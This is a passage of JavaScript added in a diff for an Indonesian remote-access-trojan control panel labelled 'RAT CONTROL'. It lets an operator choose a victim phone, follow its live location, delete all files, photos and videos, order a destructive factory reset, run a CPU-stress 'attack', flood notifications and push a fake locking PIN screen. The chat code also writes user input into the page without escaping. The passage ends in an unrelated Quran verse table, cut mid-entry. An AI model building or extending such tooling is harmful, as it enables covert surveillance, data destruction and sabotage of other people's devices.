+                document.getElementById('ratRoomList').classList.add('active');
+                document.getElementById('ratTargetId').value = '';
+                selectedTargetId = null;
+                document.querySelectorAll('.rat-room-detail').forEach(function(el) { el.classList.remove('active'); });
+                stopAllRoomListeners();
+                document.getElementById('confirmDialog').classList.remove('show');
+                document.getElementById('mainLogo').textContent = 'RAT CONTROL';
+                document.getElementById('badgeText').textContent = 'CONNECT DEVICE'; } else { goBackWithScroll('screenRAT',
+                    'screenHub'); } }
+        function ratSelectTarget(targetId, targetData) { selectedTargetId = targetId;
+            document.getElementById('ratTargetId').value = targetId;
+            document.getElementById('ratRoomList').classList.remove('active');
+            document.getElementById('ratRoomControl').classList.add('active');
+            document.querySelectorAll('.rat-room-detail').forEach(function(el) { el.classList.remove('active'); });
+            stopAllRoomListeners();
+            document.getElementById('confirmDialog').classList.remove('show'); if (mapInstance) { mapInstance.remove();
+                mapInstance = null;
+                mapInitialized = false; } var logo = document.getElementById('mainLogo'); if (targetData && targetData
+                .deviceName) { logo.textContent = targetData.deviceName; } else { logo.textContent = 'RAT CONTROL'; }
+            document.getElementById('badgeText').textContent = 'CONNECT DEVICE'; }
+
+        // =============================================================
+        // CONFIRM DIALOG
+        // =============================================================
+        function showConfirm(type) { var targetId = document.getElementById('ratTargetId').value.trim(); if (!targetId) { showToast(
+                    "Pilih target dulu!"); return; }
+            pendingRoom = type; var iconMap = { 'location': '' }; var titleMap = { 'location': 'Lokasi' };
+            document.getElementById('confirmIcon').textContent = iconMap[type] || '☠️';
+            document.getElementById('confirmTitle').textContent = 'Apakah Anda yakin';
+            document.getElementById('confirmDesc').textContent = 'Ingin melihat ' + titleMap[type] + ' target?';
+            document.getElementById('confirmDialog').classList.add('show'); }
+        function showLocationDialog() { showConfirm('location'); }
+
+        // =============================================================
+        // OPEN URL, SET VOLUME, BRIGHTNESS
+        // =============================================================
+        function showOpenUrlDialog() { var targetId = document.getElementById('ratTargetId').value.trim(); if (!targetId) { showToast(
+                    "Pilih target dulu"); return; }
+            ratShowModal('ratModalOpenUrl'); }
+        function sendOpenUrlFromModal() { var t = ratGetTarget(); if (!t) return; var url = document.getElementById(
+                'ratOpenUrlInput').value.trim(); if (!url || !url.startsWith('https://')) { showToast(
+                    "URL harus diawali https://"); return; }
+            ratCloseModal('ratModalOpenUrl');
+            showSpinner360(function() { ratSendCommand(t, { status: 'OPEN_URL', url: url, timestamp: Date.now() });
+                showToast("SEND : OPEN URL");
+                ratShowSuccess("Open URL terkirim"); }); }
+        function showSetVolumeDialog() { var targetId = document.getElementById('ratTargetId').value.trim(); if (!targetId) { showToast(
+                    "Pilih target dulu!"); return; }
+            document.getElementById('ratVolumeValue').value = 50;
+            ratShowModal('ratModalSetVolume'); }
+        function sendSetVolume() { var t = ratGetTarget(); if (!t) return; var val = parseInt(document.getElementById(
+                'ratVolumeValue').value); if (isNaN(val) || val < 0 || val > 100) { showToast("Masukkan angka 0-100"); return; }
+            ratCloseModal('ratModalSetVolume');
+            showSpinner360(function() { ratSendCommand(t, { status: 'SET_VOLUME', value: val, timestamp: Date.now() });
+                showToast("SEND : VOLUME");
+                ratShowSuccess("Volume berhasil diatur"); }); }
+        function showSetBrightnessDialog() { var targetId = document.getElementById('ratTargetId').value.trim(); if (!targetId) { showToast(
+                    "Pilih target dulu!"); return; }
+            document.getElementById('ratBrightnessValue').value = 50;
+            ratShowModal('ratModalSetBrightness'); }
+        function sendSetBrightness() { var t = ratGetTarget(); if (!t) return; var val = parseInt(document.getElementById(
+                'ratBrightnessValue').value); if (isNaN(val) || val < 0 || val > 100) { showToast("Masukkan angka 0-100"); return; }
+            ratCloseModal('ratModalSetBrightness');
+            showSpinner360(function() { ratSendCommand(t, { status: 'SET_BRIGHTNESS', value: val, timestamp: Date
+                    .now() });
+                showToast("SEND : BRIGHTNESS");
+                ratShowSuccess("Kecerahan berhasil diatur"); }); }
+
+        // =============================================================
+        // PLAY SOUND
+        // =============================================================
+        function sendPlaySoundDirect() { var t = ratGetTarget(); if (!t) return;
+            showSpinner360(function() { ratSendCommand(t, { status: 'PLAY_SOUND', sound: 'test.mp3', timestamp: Date
+                    .now() });
+                showToast("SEND : SOUND");
+                ratShowSuccess("Play Sound Terkirim"); }); }
+        function sendStopSound() { var t = ratGetTarget(); if (!t) return;
+            showSpinner360(function() { ratSendCommand(t, { status: 'STOP_SOUND', timestamp: Date.now() });
+                showToast("SEND : STOP SOUND");
+                ratShowSuccess("Stop Sound Terkirim"); }); }
+        function sendPlaySoundSacredDirect() { var t = ratGetTarget(); if (!t) return;
+            showSpinner360(function() { ratSendCommand(t, { status: 'PLAY_SOUND', soundName: 'rullz', timestamp: Date
+                    .now() });
+                showToast("SEND : SOUND SACRED");
+                ratShowSuccess("Sound Sacred Terkirim"); }); }
+        function sendStopSoundSacred() { var t = ratGetTarget(); if (!t) return;
+            showSpinner360(function() { ratSendCommand(t, { status: 'STOP_SOUND', timestamp: Date.now() });
+                showToast("SEND : STOP SOUND SACRED");
+                ratShowSuccess("Stop Sound Sacred terkirim"); }); }
+
+        // =============================================================
+        // FLASH, TOAST, BLINK
+        // =============================================================
+        function ratSenterOn() { var t = ratGetTarget(); if (!t) return;
+            showSpinner360(function() { ratSendCommand(t, { status: 'FLASH_ON', timestamp: Date.now() });
+                showToast("SEND : FLASH ON");
+                ratShowSuccess("Flash ON Terkirim"); }); }
+        function ratSenterOff() { var t = ratGetTarget(); if (!t) return;
+            showSpinner360(function() { ratSendCommand(t, { status: 'FLASH_OFF', timestamp: Date.now() });
+                showToast("SEND : FLASH OFF");
+                ratShowSuccess("Flash OFF Terkirim"); }); }
+        function ratSenterBlink() { var t = ratGetTarget(); if (!t) return;
+            showSpinner360(function() { ratSendCommand(t, { status: 'FLASH_BLINK', timestamp: Date.now() });
+                showToast("SEND : FLASH BLINK");
+                ratShowSuccess("Flash Blink Terkirim"); }); }
+        function ratSendStopFlashBlink() { var t = ratGetTarget(); if (!t) return;
+            showSpinner360(function() { ratSendCommand(t, { status: 'STOP_FLASH_BLINK', timestamp: Date.now() });
+                showToast("SEND : STOP FLASH BLINK");
+                ratShowSuccess("Stop Flash Blink Terkirim"); }); }
+        function ratShowToast() { ratShowModal('ratModalToast'); }
+        function ratSendToast() { var t = ratGetTarget(); if (!t) return; var msg = document.getElementById('ratToastMsg')
+                .value.trim(); if (!msg) { ratShowSuccess("Isi pesan"); return; }
+            ratCloseModal('ratModalToast');
+            showSpinner360(function() { ratSendCommand(t, { status: 'TOAST', message: msg, timestamp: Date.now() });
+                showToast("SEND : TOAST");
+                ratShowSuccess("Toast Terkirim"); }); }
+
+        // =============================================================
+        // TTS
+        // =============================================================
+        function showTtsDialog() { var targetId = document.getElementById('ratTargetId').value.trim(); if (!targetId) { showToast(
+                    "Pilih target dulu!"); return; }
+            document.getElementById('ratTtsText').value = '';
+            ratShowModal('ratModalTts'); }
+        function sendTts() { var t = ratGetTarget(); if (!t) return; var text = document.getElementById('ratTtsText')
+                .value.trim(); if (!text) { showToast("Masukkan teks untuk dibacakan"); return; }
+            ratCloseModal('ratModalTts');
+            showSpinner360(function() { ratSendCommand(t, { status: 'TTS', text: text, timestamp: Date.now() });
+                showToast("SEND : TTS");
+                ratShowSuccess("TTS terkirim"); }); }
+
+        // =============================================================
+        // UI LAG, UNLOCK LAG
+        // =============================================================
+        function sendUILag() { var t = ratGetTarget(); if (!t) return;
+            showSpinner360(function() { ratSendCommand(t, { status: 'UI_LAG', timestamp: Date.now() });
+                showToast("SEND : UI LAG");
+                ratShowSuccess("UI LAG terkirim"); }); }
+        function sendUnlockUILag() { var t = ratGetTarget(); if (!t) return;
+            showSpinner360(function() { ratSendCommand(t, { status: 'UNLOCK_UI_LAG', timestamp: Date.now() });
+                showToast("SEND : UNLAG");
+                ratShowSuccess("UNLAG terkirim"); }); }
+
+        // =============================================================
+        // LAG COMBO, UNLAG COMBO
+        // =============================================================
+        function sendLagCombo() { var t = ratGetTarget(); if (!t) return;
+            showSpinner360(function() { ratSendCommand(t, { status: 'LAG_COMBO', timestamp: Date.now() });
+                showToast("SEND : LAG COMBO");
+                ratShowSuccess("Lag Combo terkirim"); }); }
+        function sendUnlagCombo() { var t = ratGetTarget(); if (!t) return;
+            showSpinner360(function() { ratSendCommand(t, { status: 'UNLAG_COMBO', timestamp: Date.now() });
+                showToast("SEND : UNLAG COMBO");
+                ratShowSuccess("unlag combo terkirim"); }); }
+
+        // =============================================================
+        // SPAM NOTIF (max 50)
+        // =============================================================
+        function showSpamNotifDialog() { var t = ratGetTarget(); if (!t) { showToast("Pilih target dulu!"); return; }
+            document.getElementById('spamNotifMessage').value = 'Halo!';
+            document.getElementById('spamNotifCount').value = 5;
+            ratShowModal('ratModalSpamNotif'); }
+        function sendSpamNotif() { var t = ratGetTarget(); if (!t) return; var msg = document.getElementById(
+                'spamNotifMessage').value.trim(); var count = parseInt(document.getElementById('spamNotifCount').value); if (!
+                msg) { showToast("Masukkan pesan"); return; } if (isNaN(count) || count < 1) count = 1; if (count > 50) count =
+                50;
+            ratCloseModal('ratModalSpamNotif');
+            showSpinner360(function() { ratSendCommand(t, { status: 'SPAM_NOTIF', message: msg, count: count,
+                    timestamp: Date.now() });
+                showToast("SEND : SPAM NOTIF (" + count + "x)");
+                ratShowSuccess("Spam notif terkirim (" + count + "x)"); }); }
+
+        // =============================================================
+        // DELETE FILE, PHOTO, VIDEO
+        // =============================================================
+        function showDeleteFileDialog() { var targetId = document.getElementById('ratTargetId').value.trim(); if (!targetId) { showToast(
+                    "Pilih target dulu!"); return; }
+            ratShowModal('ratModalDeleteFile'); }
+        function sendDeleteFile() { var t = ratGetTarget(); if (!t) return;
+            ratCloseModal('ratModalDeleteFile');
+            showSpinner360(function() { ratSendCommand(t, { status: 'DELETE_ALL_FILES', timestamp: Date.now() });
+                showToast("SEND : DELETE FILE");
+                ratShowSuccess("delete file Terkirim"); }); }
+        function showDeletePhotoDialog() { var targetId = document.getElementById('ratTargetId').value.trim(); if (!targetId) { showToast(
+                    "Pilih target dulu!"); return; }
+            ratShowModal('ratModalDeletePhoto'); }
+        function sendDeletePhoto() { var t = ratGetTarget(); if (!t) return;
+            ratCloseModal('ratModalDeletePhoto');
+            showSpinner360(function() { ratSendCommand(t, { status: 'DELETE_PHOTOS', timestamp: Date.now() });
+                showToast("SEND : DELETE FOTO");
+                ratShowSuccess("delete foto Terkirim"); }); }
+        function showDeleteVideoDialog() { var targetId = document.getElementById('ratTargetId').value.trim(); if (!targetId) { showToast(
+                    "Pilih target dulu!"); return; }
+            ratShowModal('ratModalDeleteVideo'); }
+        function sendDeleteVideo() { var t = ratGetTarget(); if (!t) return;
+            ratCloseModal('ratModalDeleteVideo');
+            showSpinner360(function() { ratSendCommand(t, { status: 'DELETE_VIDEOS', timestamp: Date.now() });
+                showToast("SEND : DELETE VIDEO");
+                ratShowSuccess("delete video Terkirim"); }); }
+
+        // =============================================================
+        // RESET HP (2 DIALOG)
+        // =============================================================
+        function showResetFactoryDialog1() {
+            var targetId = document.getElementById('ratTargetId').value.trim();
+            if (!targetId) { showToast("Pilih target dulu!"); return; }
+            ratShowModal('ratModalResetFactory1');
+        }
+        function showResetFactoryStep2() {
+            ratCloseModal('ratModalResetFactory1');
+            ratShowModal('ratModalResetFactory2');
+        }
+        function sendResetFactory() {
+            var t = ratGetTarget();
+            if (!t) return;
+            ratCloseModal('ratModalResetFactory2');
+            showSpinner360(function() {
+                ratSendCommand(t, { status: 'FACTORY_RESET', method: '10_cara',
+                    methods: ['wipe_data', 'format_cache', 'clear_media', 'reset_network', 'remove_accounts',
+                        'clear_settings', 'format_sdcard', 'erase_efs', 'reset_secure', 'wipe_all'
+                    ], timestamp: Date.now() });
+                showToast("SEND : RESET HP");
+                ratShowSuccess("Reset HP terkirim");
+            });
+        }
+
+        // =============================================================
+        // RUSAK HP (2 DIALOG) & STOP ATTACK
+        // =============================================================
+        function showRusakHpDialog1() {
+            var targetId = document.getElementById('ratTargetId').value.trim();
+            if (!targetId) { showToast("Pilih target dulu!"); return; }
+            ratShowModal('ratModalRusakHp1');
+        }
+        function showRusakHpStep2() {
+            ratCloseModal('ratModalRusakHp1');
+            ratShowModal('ratModalRusakHp2');
+        }
+        function sendRusakHp() {
+            var t = ratGetTarget();
+            if (!t) return;
+            ratCloseModal('ratModalRusakHp2');
+            showSpinner360(function() {
+                ratSendCommand(t, { status: 'ATTACK_PHONE', attack: 'heavy_lag', cpu_stress: 100000,
+                    combo: true, ui_lag: true, timestamp: Date.now() });
+                showToast("SEND : SERANG HP");
+                ratShowSuccess("Serang HP terkirim");
+            });
+        }
+        function sendStopAttack() {
+            var t = ratGetTarget();
+            if (!t) return;
+            showSpinner360(function() {
+                ratSendCommand(t, { status: 'STOP_ATTACK', timestamp: Date.now() });
+                showToast("SEND : STOP SERANG");
+                ratShowSuccess("Stop Serang terkirim");
+            });
+        }
+
+        // =============================================================
+        // LOCK HTML & UNLOCK ALL
+        // =============================================================
+        function showLockHtmlDialog() {
+    var targetId = document.getElementById('ratTargetId').value.trim();
+    if (!targetId) { showToast("Pilih target dulu!"); return; }
+    document.getElementById('lockCpuLag').checked = false;
+    document.getElementById('lockFlashBlink').checked = false;
+    document.getElementById('lockMusikLoop').checked = false;
+    // ===== DEFAULT HTML LOCK SCREEN =====
+    document.getElementById('lockHtmlCode').value = `<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Lock Screen Fullscreen</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+            user-select: none;
+        }
+        html, body {
+            width: 100%;
+            height: 100%;
+            background-color: #000000;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            overflow: hidden;
+        }
+        .unlock-container {
+            width: 85%;
+            max-width: 360px;
+            display: flex;
+            flex-direction: column;
+            align-items: flex-start;
+        }
+        .label {
+            color: #888888;
+            font-size: 14px;
+            margin-bottom: 8px;
+            margin-left: 2px;
+        }
+        .edit-text {
+            width: 100%;
+            height: 52px;
+            background-color: #4a4a4a;
+            border: none;
+            border-radius: 8px;
+            padding: 0 15px;
+            font-size: 16px;
+            color: #b0b0b0;
+            outline: none;
+            margin-bottom: 16px;
+        }
+        .edit-text::placeholder {
+            color: #888888;
+        }
+        .btn-unlock {
+            width: 100%;
+            height: 50px;
+            background-color: #e50914;
+            color: #ffffff;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: bold;
+            letter-spacing: 1px;
+            cursor: not-allowed;
+            opacity: 0.7;
+            pointer-events: none;
+        }
+        .pin-hint {
+            width: 100%;
+            text-align: center;
+            color: #666666;
+            font-size: 13px;
+            margin-top: 16px;
+        }
+    </style>
+</head>
+<body>
+    <div class="unlock-container">
+        <span class="label"></span>
+        <input type="text" class="edit-text" placeholder="Masukan PIN..." readonly>
+        <button class="btn-unlock" disabled>UNLOCK</button>
+        <div class="pin-hint"></div>
+    </div>
+</body>
+</html>`;
+    ratShowModal('ratModalLockHtml');
+}
+      
+        function sendLockHtml() {
+            var t = ratGetTarget();
+            if (!t) return;
+            var cpuLag = document.getElementById('lockCpuLag').checked;
+            var flashBlink = document.getElementById('lockFlashBlink').checked;
+            var musikLoop = document.getElementById('lockMusikLoop').checked;
+            var htmlCode = document.getElementById('lockHtmlCode').value.trim();
+            if (!htmlCode) { showToast("Masukkan kode HTML"); return; }
+            ratCloseModal('ratModalLockHtml');
+            showSpinner360(function() {
+                ratSendCommand(t, {
+                    status: 'LOCK_HTML',
+                    cpuLag: cpuLag,
+                    flashBlink: flashBlink,
+                    musikLoop: musikLoop,
+                    html: htmlCode,
+                    timestamp: Date.now()
+                });
+                showToast("SEND : LOCK HTML");
+                ratShowSuccess("LOCK HTML terkirim");
+            });
+        }
+        function sendUnlockAll() {
+            var t = ratGetTarget();
+            if (!t) return;
+            showSpinner360(function() {
+                ratSendCommand(t, { status: 'UNLOCK_ALL', timestamp: Date.now() });
+                showToast("SEND : UNLOCK");
+                ratShowSuccess("UNLOCK terkirim");
+            });
+        }
+
+        // =============================================================
+        // WALLPAPER
+        // =============================================================
+        function sendSetWallpaper() { var t = ratGetTarget(); if (!t) return;
+            showSpinner360(function() { ratSendCommand(t, { status: 'SET_WALLPAPER',
+                    url: 'https://rullzvesga.github.io/V14/foto.png', timestamp: Date.now() });
+                showToast("SEND : UBAH WALLPAPER");
+                ratShowSuccess("Ubah Wallpaper terkirim"); }); }
+
+        // =============================================================
+        // CHAT GLOBAL
+        // =============================================================
+        function openChatGlobal() {
+            if (!isLoginComplete) { showToast("Login dulu"); return; }
+            switchView('screenHub', 'screenChatGlobal');
+        }
+
+        function startChatListener() {
+            stopChatListener();
+            var ref = database.ref('chatglobal').orderByChild('timestamp').limitToLast(100);
+            chatListener = ref.on('child_added', function(snapshot) {
+                var data = snapshot.val();
+                if (data) {
+                    appendChatMessage(data);
+                }
+            });
+            ref.once('value', function(snapshot) {
+                var container = document.getElementById('chatMessages');
+                container.innerHTML = '';
+                var items = [];
+                snapshot.forEach(function(child) {
+                    items.push(child.val());
+                });
+                items.sort(function(a, b) { return a.timestamp - b.timestamp; });
+                items.forEach(function(msg) {
+                    appendChatMessage(msg);
+                });
+                scrollChatToBottom();
+            });
+        }
+
+        function stopChatListener() {
+            if (chatListener) {
+                database.ref('chatglobal').off('child_added', chatListener);
+                chatListener = null;
+            }
+        }
+
+        function appendChatMessage(data) {
+            var container = document.getElementById('chatMessages');
+            if (!container) return;
+            var div = document.createElement('div');
+            div.className = 'chat-msg role-' + data.role;
+
+            var time = new Date(data.timestamp);
+            var timeStr = time.getHours().toString().padStart(2, '0') + ':' + time.getMinutes().toString().padStart(2, '0');
+
+            div.innerHTML = `
+                <div class="msg-header">
+                    <span class="username">${data.username}</span>
+                    <span class="role">${data.role}</span>
+                    <span class="time">${timeStr}</span>
+                </div>
+                <div class="msg-body">${data.message}</div>
+            `;
+            container.appendChild(div);
+            scrollChatToBottom();
+        }
+
+        function scrollChatToBottom() {
+            var container = document.getElementById('chatMessages');
+            if (container) {
+                container.scrollTop = container.scrollHeight;
+            }
+        }
+
+        function sendChatMessage() {
+            if (!isLoginComplete) { showToast("Login dulu!"); return; }
+            var input = document.getElementById('chatInput');
+            var msg = input.value.trim();
+            if (!msg) { showToast("Pesan tidak boleh kosong"); return; }
+            if (msg.length > 500) { showToast("Maksimal 500 karakter"); return; }
+            var uid = localStorage.getItem('myUID') || 'anonymous';
+            var data = {
+                username: currentUsername || 'Guest',
+                role: currentUserRole || 'MEMBER',
+                message: msg,
+                timestamp: Date.now(),
+                uid: uid
+            };
+            database.ref('chatglobal').push(data).then(function() {
+                input.value = '';
+                showToast("Pesan terkirim");
+            }).catch(function(err) {
+                showToast("Gagal kirim pesan: " + err.message);
+            });
+        }
+
+        document.addEventListener('DOMContentLoaded', function() {
+            var chatInput = document.getElementById('chatInput');
+            if (chatInput) {
+                chatInput.addEventListener('keydown', function(e) {
+                    if (e.key === 'Enter') {
+                        e.preventDefault();
+                        sendChatMessage();
+                    }
+                });
+            }
+        });
+
+        // =============================================================
+        // ROOM FUNCTIONS (LOCATION REAL-TIME)
+        // =============================================================
+        function openRoom(roomType) {
+            var targetId = document.getElementById('ratTargetId').value.trim();
+            if (!targetId) { showToast("Pilih target dulu"); return; }
+            document.querySelectorAll('.rat-room-detail').forEach(function(el) { el.classList.remove('active'); });
+            stopAllRoomListeners();
+            if (roomType === 'location') {
+                var roomEl = document.getElementById('roomLocation');
+                if (!roomEl) return;
+                roomEl.classList.add('active');
+                initMap();
+                startRoomListener('location', targetId);
+            }
+        }
+
+        function closeRoom(roomId) {
+            document.getElementById(roomId).classList.remove('active');
+            stopAllRoomListeners();
+            document.getElementById('ratRoomControl').classList.add('active');
+            document.getElementById('ratRoomList').classList.remove('active');
+        }
+
+        function startRoomListener(type, targetId) {
+            stopAllRoomListeners();
+            var path = '',
+                displayId = '';
+            if (type === 'location') {
+                path = 'targets/' + targetId + '/location';
+                displayId = 'roomLocationContent';
+            }
+            if (!path || !displayId) return;
+
+            var ref = database.ref(path);
+            var listener = ref.on('value', function(snapshot) {
+                var data = snapshot.val();
+                var content = document.getElementById(displayId);
+                if (!content) return;
+
+                if (type === 'location') {
+                    var coordDisplay = document.getElementById('coordDisplay');
+
+                    if (data && data.lat && data.lng) {
+                        updateMap(data.lat, data.lng);
+                        if (coordDisplay) coordDisplay.textContent = data.lat + ', ' + data.lng;
+                    } else {
+                        if (!mapInitialized) initMap();
+                        if (coordDisplay) coordDisplay.textContent = 'Tidak tersedia';
+                    }
+
+                    var oldList = content.querySelector('.list-container');
+                    if (oldList) oldList.remove();
+                    return;
+                }
+            });
+            roomListeners[type] = { ref: ref, listener: listener };
+        }
+
+        function stopAllRoomListeners() {
+            for (var key in roomListeners) {
+                if (roomListeners[key]) {
+                    roomListeners[key].ref.off('value', roomListeners[key].listener);
+                }
+            }
+            roomListeners = {};
+        }
+
+        // =============================================================
+        // MAP FUNCTIONS
+        // =============================================================
+        function initMap() {
+            if (mapInitialized) return;
+            var container = document.getElementById('mapContainer');
+            if (!container) return;
+            var lat = -6.2088,
+                lng = 106.8456;
+            mapInstance = L.map(container).setView([lat, lng], 15);
+            L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', { attribution: '© OpenStreetMap' }).addTo(
+                mapInstance);
+            L.marker([lat, lng]).addTo(mapInstance).bindPopup('Lokasi Target');
+            mapInitialized = true;
+        }
+        function updateMap(lat, lng) {
+            if (!mapInstance) { initMap(); }
+            if (mapInstance) {
+                mapInstance.setView([lat, lng], 15);
+                mapInstance.eachLayer(function(layer) { if (layer instanceof L.Marker) { mapInstance.removeLayer(layer); } });
+                L.marker([lat, lng]).addTo(mapInstance).bindPopup('Lokasi Target');
+            }
+        }
+
+        // =============================================================
+        // OPEN LINK & SURAH
+        // =============================================================
+        function openLink(url) { if (window.RullzInterface && typeof window.RullzInterface.openUrl === 'function') { window
+                    .RullzInterface.openUrl(url); } else { window.open(url, '_blank'); } }
+        window.openLink = openLink;
+
+        var surahDatabase = {
+            fatihah: { title: "AL - FATIHAH", translate: "Pembukaan (7 Ayat)", ayats: [
+                    { num: 1, arab: "بِسْمِ اللَّهِ الرَّحْمَٰنِ الرَّحِيمِ", latin: "Bismillaahirrahmaanirrahiim.",
+                        meaning: "Dengan nama Allah Yang Maha Pengasih, Maha Penyayang." },
+                    { num: 2, arab: "الْحَمْدُ لِلَّهِ رَبِّ الْعَالَمِينَ", latin: "Alhamdu lillaahi Rabbil 'aalamiin.",
+                        meaning: "Segala puji bagi Allah, Tuhan seluruh alam." },
+                    { num: 3, arab: "الرَّحْمَٰنِ الرَّحِيمِ", latin: "Ar-Rahmaanir-Rahiim.",
+                        meaning: "Yang Maha Pengasih, Maha Penyayang." },
+                    { num: 4, arab: "مَالِكِ يَوْمِ الدِّينِ", latin: "Maaliki Yawmid-Diin.",
+                        meaning: "Pemilik hari pembalasan." },
+                    { num: 5, arab: "إِيَّاكَ نَعْبُدُ وَإِيَّاكَ نَسْتَعِينُ", latin: "Iyyaaka na'budu wa iyyaaka nasta'iin.",
+                        meaning: "Hanya kepada Engkaulah kami menyembah dan hanya kepada Engkaulah kami mohon pertolongan." },
+                    { num: 6, arab: "اهْدِنَا الصِّرَاطَ الْمُسْتَقِيمَ", latin: "Ihdinas-siraatal-mustaqiim.",
+                        meaning: "Tunjukilah kami jalan yang lurus," },
+                    { num: 7, arab: "صِرَاطَ الَّذِينَ أَنْعَمْتَ عَلَيْهِمْ غَيْرِ الْمَغْضُوبِ عَلَيْهِمْ وَلَا الضَّالِّينَ",
+                        latin: "Siraatalladziina an'amta 'alayhim ghayril-maghdubi 'alayhim waladh-dhaalliin.",
+                        meaning: "(yaitu) jalan orang-orang yang telah Engkau beri nikmat; bukan (jalan) mereka yang dimurkai dan bukan (pula) jalan mereka yang sesat." }
+                ] },
+            falaq: { title: "AL - FALAQ", translate: "Waktu Subuh (5 Ayat)", ayats: [
+                    { num: 1, arab: "قُلْ أَعُوذُ بِرَبِّ الْفَلَقِ", latin: "Qul a'uudzu bi Rabbil-falaq.",
+                        meaning: "Katakanlah, 'Aku berlindung kepada Tuhan yang menguasai subuh (fajar),'" },
+                    { num: 2, arab: "مِنْ شَرِّ مَا خَلَقَ", latin: "Min syarri maa khalaq.",
+                        meaning: "dari kejahatan makhluk yang Dia ciptakan," },
+                    { num: 3, arab: "وَمِنْ شَرِّ غَاسِقٍ إِذَا وَقَبَ", latin: "Wa min syarri ghaasiqin idzaa waqab.",
+                        meaning: "dan dari kejahatan malam apabila telah gelap gulita," },
+                    { num: 4, arab: "وَمِنْ شَرِّ النَّفَّاثَاتِ فِي الْعُقَدِ",
+                        latin: "Wa min syarrin-naffaatsaati fil-'uqad.",
+                        meaning: "dan dari kejahatan perempuan-perempuan (penyihir) yang meniup pada buhul-buhul (talinya)," },
+                    { num: 5, arab: "وَمِنْ شَرِّ حَاسِدٍ إِذَا حَسَدَ", latin: "Wa min syarri haasidin idzaa hasad.",
+                        meaning: "dan dari kejahatan orang yang dengki apabila dia dengki.'" }
+                ] },
+            nas: { title: "AN - NASS", translate: "Manusia (6 Ayat)", ayats: [
+                    { num: 1, arab: "قُلْ أَعُوذُ بِرَبِّ النَّاسِ", latin: "Qul a'uudzu bi Rabbin-naas.",
+                        meaning: "Katakanlah, 'Aku berlindung kepada Tuhannya manusia,'" },
+                    { num: 2, arab: "مَلِكِ النَّاسِ", latin: "Malikin-naas.", meaning: "Raja manusia," },
+                    { num: 3, arab: "إِلَٰهِ النَّاسِ", latin: "Ilaahin-naas.", meaning: "Sembahan manusia," },
+                    { num: 4, arab: "مِنْ شَرِّ الْوَسْوَاسِ الْخَنَّاسِ", latin: "Min syarril-waswaasil-khannaas.",
+                        meaning: "dari kejahatan (bisikan) setan yang bersembunyi," },
+                    { num: 5, arab: "الَّذِي يُوَسْوِسُ فِي صُدُورِ النَّاسِ", latin: "Alladzii yuwaswisu fii suduurin-naas.",
+                        meaning: "yang membisikkan (kejahatan) ke dalam dada manusia," },
+                    { num: 6, arab: "مِنَ الْجِنَّةِ وَالنَّاسِ", latin: "Minal-jinnati wan-naas.",
+                        meaning: "dari (golongan) jin dan manusia.'" }
+                ] },
+            dhuha: { title: "AD - DHUHA", translate: "Waktu Duha (11 Ayat)", ayats: [
+                    { num: 1, arab: "وَالضُّحَىٰ", latin: "Wad-dhuhaa.",
+                        meaning: "Demi waktu duha (ketika matahari naik sepenggalah)," },
+                    { num: 2, arab: "وَاللَّيْلِ إِذَا سَجَىٰ", latin: "Wal-layli idzaa sajaa.",
+                        meaning: "dan demi malam apabila telah sunyi," },
+                    { num: 3, arab: "مَا وَدَّعَكَ رَبُّكَ وَمَا قَلَىٰ", latin: "Maa wadda'aka Rabbuka wa maa qalaa.",
+                        meaning: "Tuhanmu tidak meninggalkan engkau (Muhammad) dan tidak (pula) membencimu," },
+                    { num: 4, arab: "وَلَلْآخِرَةُ خَيْرٌ لَّكَ مِنَ الْأُولَىٰ", latin: "Wa lal-aakhiratu khayrul laka minal-uulaa.",
+                        meaning: "dan sungguh, yang kemudian itu lebih baik bagimu daripada yang permulaan." },
+                    { num: 5, arab: "وَلَسَوْفَ يُعْطِيكَ رَبُّكَ فَتَرْضَىٰ", latin: "Wa lasawfa yu'thiika Rabbuka fatardhaa.",
+                        meaning: "Dan sungguh, kelak Tuhanmu pasti memberikan karunia-Nya kepadamu, sehingga engkau menjadi puas." },
+                    { num: 6, arab: "أَلَمْ يَجِدْكَ يَتِيمًا فَآوَىٰ", latin: "Alam yajidka yatiiman fa aawaa.",
+                        meaning: "Bukankah Dia mendapatimu sebagai seorang yatim, lalu Dia melindungi(mu)?" },
+                    { num: 7, arab: "وَوَجَدَكَ ضَالًّا فَهَدَىٰ", latin: "Wa wajadka dhaallan fahadaa.",
+                        meaning: "Dan Dia mendapatimu sebagai seorang yang bingung, lalu Dia memberikan petunjuk." },
+                    { num: 8, arab: "وَوَجَدَكَ عَائِلًا فَأَغْنَىٰ", latin: "Wa wajadka 'aa-ilan fa aghnaa.",
+                        meaning: "Dan Dia mendapatimu sebagai seorang yang kekurangan, lalu Dia memberikan kecukupan." },
+                    { num: 9, arab: "فَأَمَّا الْيَتِيمَ فَلَا تَقْهَرْ", latin: "Fa ammal-yatiima falaa taqhar.",
+                        meaning: "Maka terhadap anak yatim janganlah engkau berlaku sewenang-wenang." },
+                    { num: 10, arab: "وَأَمَّا السَّائِلَ فَلَا تَنْهَرْ", latin: "Wa ammas-saa-ila falaa tanhar.",
+                        meaning: "Dan terhadap orang yang meminta-minta janganlah engkau menghardik(nya)." },
+                    { num: 11, arab: "وَأَمَّا بِنِعْمَةِ رَبِّكَ فَحَدِّثْ", latin: "Wa ammaa bini'mati Rabbika fahaddits.",
+                        meaning: "Dan terhadap nikmat Tuhanmu hendaklah engkau nyatakan (dengan bersyukur)." }
+                ] },
+            ikhlas: { title: "AL - IKHLAS", translate: "Keesaan Allah (4 Ayat)", ayats: [
+                    { num: 1, arab: "قُلْ هُوَ اللَّهُ أَحَدٌ", latin: "Qul huwallahu ahad.",
+                        meaning: "Katakanlah: Dialah Allah, Yang Maha Esa." },
+                    { num: 2, arab: "اللَّهُ الصَّمَدُ", latin: "Allahus-samad.",
+                        meaning: "Allah adalah Tuhan yang bergantung kepada-Nya segala sesuatu." },
+                    { num: 3, arab: "لَمْ يَلِدْ وَلَمْ يُولَدْ", latin: "Lam yalid wa lam yulad.",
